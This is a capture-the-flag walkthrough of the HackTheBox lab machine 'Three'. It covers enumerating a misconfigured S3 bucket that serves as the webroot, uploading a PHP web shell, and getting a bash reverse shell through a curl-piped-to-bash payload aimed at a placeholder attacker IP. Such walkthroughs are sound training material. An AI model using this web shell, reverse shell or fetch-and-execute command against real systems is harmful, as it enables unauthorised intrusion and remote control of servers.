## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.50.86  
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 09:02 EST
Nmap scan report for 10.129.50.86
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds
```

Just like a typical ctf challenge, we got 2 open ports.
- port `22`: running `OpenSSH 7.6p1`
- port `80`: running `Apache httpd 2.4.29`

Visiting the website, I found out that it was just a static web-site which did nothing, but scrolling down to the bottom, I found an interesting thing. 

A domain `thetoppers.htb`. I added the domain to `/etc/hosts` file with the corresponding IP address to be able to access this domain in my browser.

The `/etc/hosts` file is used to resolve a hostname into an IP address. By default, the `/etc/hosts` file is
queried before the DNS server for hostname resolution thus we will need to add an entry in the
`/etc/hosts` file for this domain to enable the browser to resolve the address for `thetoppers.htb` .

```
echo "<machine IP> thetoppers.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Now, I decided to run `gobuster` against the domain to enumerate sub-domains

```
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u
http://thetoppers.htb
```

And i got back the following results: 

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ gobuster vhost -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb/ 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/22 09:06:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
...
```

I added this sub-domain to the `/etc/hosts` file too.

```
echo "<machine IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Visiting the web-page, I found out that it contains only the following JSON.
`{"status": "running"}`

![three-1](https://user-images.githubusercontent.com/87711310/213921329-b85f348d-1e0e-4341-9f74-4ee4420bd473.png)


It's an `aws s3 bucket`, so i decided to use `awscli` to further enumerate the machine

We can interact with this `S3 bucke`t with the aid of the `awscli` utility. It can be installed on Linux using the
command 
```
apt install awscli
```

Then, we need to configure it using the following command:
```
aws configure
```

We can list all of the S3 buckets hosted by the server by using the `ls` command.

```
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2023-01-22 08:52:20 thetoppers.htb
```

We can also use the ls command to list objects and common prefixes under the specified bucket.

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

And it retured the following results:
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2023-01-22 08:52:20          0 .htaccess
2023-01-22 08:52:20      11952 index.php
```


We see the files `index.php` , `.htaccess` and a directory called `images` in the specified bucket. It seems like
this is the webroot of the website running on port `80` . So the Apache server is using this S3 bucket as
storage.

`awscli` has got another feature that allows us to `copy files` to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution.

We can use the following PHP one-liner which uses the `system()` function which takes the URL parameter
cmd as an input and executes it as a system command.

```php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.

```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

We can confirm that our shell is uploaded by navigating to `http://thetoppers.htb/shell.php`. 

Let us try executing the OS command `id` using the URL parameter `cmd` .

![three-2](https://user-images.githubusercontent.com/87711310/213921648-f1229ca8-bf7f-4bed-ab74-8300cb23857a.png)

The response from the server contains the output of the OS command id , which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.

```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

We will start a `netcat` listener on our local port 1337 using the following command.
```
nc -lvnp 1337
```

Let's start a web server on our local machine on port 8000 and host this bash file.
```
python3 -m http.server 8000
```

We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
in order to execute it. Thus, let us visit the following URL containing the payload in the browser.

```
https://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
```

We receive a reverse shell on the corresponding listening port.

```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 1337                              
listening on [any] 1337 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.50.86] 41150
bash: cannot set terminal process group (1571): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ whoami
whoami
www-data
...
```

The flag can be found at `/var/www/flag.txt` .
```
www-data@three:/var/www/html$ cd ..
cd ..
www-data@three:/var/www$ ls
ls
flag.txt
html
www-data@three:/var/www$ cat flag.txt
cat flag.txt
[REDACTED]
```
